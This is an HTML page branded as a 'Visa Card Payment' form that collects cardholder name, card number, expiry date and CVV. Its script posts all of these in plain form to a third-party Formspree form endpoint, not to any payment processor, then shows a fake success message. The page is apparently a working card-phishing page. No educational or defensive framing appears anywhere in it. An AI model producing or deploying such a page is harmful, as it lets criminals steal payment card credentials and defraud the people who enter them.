<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Payment Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .payment-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            width: 350px;
        }
        .payment-container h2 {
            margin-bottom: 20px;
            text-align: center;
            color: #333;
        }
        .input-field {
            margin-bottom: 15px;
        }
        .input-field label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .input-field input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #0056b3;
        }
        .loading {
            display: none;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <h2>Visa Card Payment</h2>
        <form id="payment-form">
            <div class="input-field">
                <label for="card-name">Cardholder Name</label>
                <input type="text" id="card-name" name="card-name" placeholder="John Doe" required>
            </div>
            <div class="input-field">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9101 1121" maxlength="19" required>
            </div>
            <div class="input-field">
                <label for="expiry">Expiration Date</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
            </div>
            <div class="input-field">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
            </div>
            <button type="submit" class="submit-btn">Submit</button>
        </form>
        <div class="loading" id="loading">
            <p>Processing... Please wait.</p>
        </div>
    </div>

    <script>
        document.getElementById('payment-form').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission

            // Show the loading screen
            document.getElementById('payment-form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // Collect form data
            const formData = {
                cardName: document.getElementById('card-name').value,
                cardNumber: document.getElementById('card-number').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value
            };

            try {
                // Send JSON data to the server
                const response = await fetch('https://formspree.io/f/manygdbz', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData) // Convert the data to JSON
                });

                if (response.ok) {
                    alert('Payment submitted successfully!');
                } else {
                    const error = await response.json();
                    alert(`Error: ${error.message}`);
                }
            } catch (error) {
                alert('Error submitting payment. Please try again later.');
                console.error(error);
            } finally {
                // Reset the form and hide the loading screen
                document.getElementById('loading').style.display = 'none';
                document.getElementById('payment-form').style.display = 'block';
            }
        });
    </script>
</body>
</html>
